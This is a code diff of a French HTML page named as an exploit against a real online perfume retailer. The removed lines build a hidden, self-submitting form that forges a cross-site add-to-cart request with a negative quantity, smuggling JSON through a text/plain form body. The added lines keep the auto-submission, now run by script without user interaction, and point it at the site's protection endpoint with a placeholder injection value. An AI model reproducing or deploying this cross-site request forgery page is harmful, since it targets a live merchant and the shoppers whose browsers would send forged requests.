@@ -1,18 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chargement en cours...</title>
+    <title>Redirection en cours...</title>
 </head>
-<body onload="document.getElementById('exploit-form').submit()">
-    <p>Veuillez patienter pendant la redirection...</p>
-    
+<body>
     <form id="exploit-form" 
-          action="https://www.iciparisxl.lu/kerastase/p/BP_1293634/add-to-cart" 
+          action="https://www.iciparisxl.lu/resources/1ade93f5d8f005313236463468176aaaad1001495f588/ah?a=1701637501&b=FzSxIS1Zbs4s86mK&ss=2&c=63468176aaaad1001495f588&d=0&r=isNT2k60NIzS0utL&u=https%3A%2F%2Fwww.iciparisxl.lu%2Fkerastase%2Fp%2FBP_1293634&h=1772332740&s=1&sp=false&pp=false&t=1778861966112&sm=1&tr=1" 
           method="POST" 
-          enctype="text/plain" 
-          style="display:none;">
+          enctype="text/plain">
         
-        <input type="hidden" name='{"productCode":"BP_1293634","qty":-1,"ignore_me":"' value='"}'>
+        <input type="hidden" name='payload ' value='= "votre_code_injecte_ici"'>
     </form>
+
+    <script>
+        // Soumission automatique sans interaction utilisateur
+        document.getElementById('exploit-form').submit();
+    </script>
 </body>
 </html>
